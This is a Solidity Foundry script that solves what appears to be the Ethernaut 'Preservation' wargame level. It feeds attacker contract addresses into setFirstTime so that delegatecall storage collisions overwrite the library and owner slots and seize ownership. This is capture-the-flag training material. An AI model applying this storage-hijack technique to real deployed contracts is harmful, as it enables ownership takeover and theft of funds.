// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {DevOpsTools} from "foundry-devops/src/DevOpsTools.sol";
import {Preservation} from "../../src/puzzles/16/Preservation.sol";

contract PreservationSolution is Script {
    function run(address target) external {
        address attackerContract1 = DevOpsTools.get_most_recent_deployment("PreservationAttacker1", block.chainid);
        address attackerContract2 = DevOpsTools.get_most_recent_deployment("PreservationAttacker2", block.chainid);
        console.log("PreservationAttacker1 address: ");
        console.logAddress(attackerContract1);
        console.log("PreservationAttacker2 address: ");
        console.logAddress(attackerContract2);

        Preservation puzzleContract = Preservation(target);
        vm.startBroadcast();
        puzzleContract.setFirstTime(uint256(uint160(address(attackerContract1))));
        puzzleContract.setFirstTime(uint256(uint160(address(attackerContract2))));
        puzzleContract.setSecondTime(uint256(uint160(msg.sender)));
        vm.stopBroadcast();

        console.log("Player address: ", puzzleContract.owner());
    }
}